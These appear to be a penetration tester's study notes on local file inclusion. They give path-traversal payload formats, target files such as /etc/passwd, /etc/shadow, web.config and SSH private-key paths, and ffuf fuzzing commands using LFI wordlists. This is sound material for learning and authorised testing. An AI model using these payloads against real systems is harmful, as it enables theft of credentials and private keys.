General format to look out for
	view?file=../../../../../../../../
	index.php?view=../../../../../../../../

Common Web Roots and config files
```bash
# IIS
C:\inetpub\wwwroot
	\application\web.config
	\web.config

# XAMPP
C:\xampp\htdocs
	\conf\extra\httpd-xampp.conf
	\conf\httpd.conf
\xampp\php\php.ini # php conf file
\xampp\mysql\bin\my.ini # mysql conf file

# Linux
/var/www/html
/var/www/<site>
```

Research program versions and credential locations for those programs if you find an LFI present.

Also check BURP Responses for all requests, you may get more information than the page displays
## Low Hanging Fruit
Linux:
`/etc/passwd
`/etc/shadow`
config files (research default locations)

Windows:
`/WINDOWS/system32/drivers/etc/hosts`

SSH Keys
```bash
# Linux
/home/<user>/.ssh/<keys>
/home/<user>/<keys>

# Windows
/Users/<user>/.ssh/<keys>
/Users/<user>/<keys>

# Keys -- RSA/DSA/EC/OPENSSH 32/64 for reference
id_rsa
id_dsa
id_ecdsa
id_eddsa
id_ecdsa_sk 
id_ed25519 
id_ed25519_sk
```
Conceptually, windows and linux storage of ssh keys are very similar

Also consider checking out [this](https://s4thv1k.com/posts/oscp-cheatsheet/#important-locations)

If low hanging fruit fails us, we can fuzz for stuff like config files, log files, etc...

## LFI Fuzzing
We can use burp intruder to fuzz the path but it sucks without burp pro

Use LFI wordlists `/usr/share/wordlists/seclists/Fuzzing/LFI`
	LFI-Jhaddix.txt   `START HERE`
	LFI-LFISuite-pathtotest-huge.txt

Fuzzing
```bash
# When fuzzing, run twice
1. General scan
ffuf -w /usr/share/seclists/Fuzzing/LFI/<wordlist>:FUZZ -u http://$IP/<view>?<file>=/../../../../../../../FUZZ -ac

2. Specify default web root
ffuf -w /usr/share/seclists/Fuzzing/LFI/<wordlist>:FUZZ -u http://$IP/<view>?<file>=/../../../../../../../<web>/<root>/FUZZ -ac

# If something has to come AFTER the specified file, include it in the ffuf command
```



